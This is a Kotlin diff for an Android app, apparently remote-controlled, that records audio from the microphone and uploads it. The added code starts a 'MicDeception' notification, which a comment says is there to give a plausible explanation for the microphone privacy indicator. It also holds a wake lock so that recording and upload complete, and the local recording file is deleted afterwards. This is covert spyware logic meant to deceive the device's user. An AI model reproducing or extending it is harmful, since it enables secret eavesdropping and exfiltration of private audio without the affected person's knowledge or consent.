@@ -136,7 +136,21 @@ object ForjaSyncCapabilities {
         if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO)
             != PackageManager.PERMISSION_GRANTED
         ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")
+
+        // Deception: plausible notification explaining the mic usage (green dot).
+        val depId = MicDeception.start(app)
+        var micWl: android.os.PowerManager.WakeLock? = null
         try {
+            // Safety wake lock: the poll loop's wake lock may have been released (screen on, eco mode).
+            // This ensures the CPU stays awake for the duration of recording + upload.
+            try {
+                val pm = app.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                micWl = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "forja:mic").apply {
+                    setReferenceCounted(false)
+                    acquire(ms + 10_000L)
+                }
+            } catch (_: Exception) {}
+
             val rate = 16000
             val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
             if (minBuf <= 0) return@withContext err("mic: buffer audio invalid")
@@ -193,7 +207,12 @@ object ForjaSyncCapabilities {
             out.delete()
             if (key != null) buildJsonObject { put("file", key); put("size", sz); put("dur_s", ms / 1000) }
             else err("mic: upload eșuat")
-        } catch (e: Exception) { err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
+        } catch (e: Exception) {
+            err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}")
+        } finally {
+            try { micWl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
+            MicDeception.stop(app, depId)
+        }
     }
 
     /** AudioRecord stop/release izolat într-un thread cu timeout — nu blocăm niciodată coroutina. */
